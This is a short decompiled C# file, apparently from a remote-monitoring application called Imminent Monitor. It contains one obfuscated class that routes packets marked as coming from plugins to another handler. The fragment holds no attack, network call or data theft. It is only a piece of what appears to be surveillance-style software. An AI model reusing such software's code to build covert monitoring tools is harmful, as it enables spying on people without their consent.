// Decompiled with JetBrains decompiler
// Type: Class85
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Microsoft.VisualBasic.CompilerServices;
using System.Collections.Generic;
using System.Runtime.CompilerServices;

[StandardModule]
internal sealed class Class85
{
  public static void smethod_0(GClass18 gclass18_0, string string_0, object[] object_0)
  {
    if ((dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PluginPacket) object_0[1] != dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PluginPacket.FromPlugin)
      return;
    List<object> objectList = new List<object>();
    int num = object_0.Length - 1;
    for (int index = 3; index <= num; ++index)
      objectList.Add(RuntimeHelpers.GetObjectValue(object_0[index]));
    Class108.smethod_7(gclass18_0, (string) object_0[2], objectList.ToArray());
  }
}
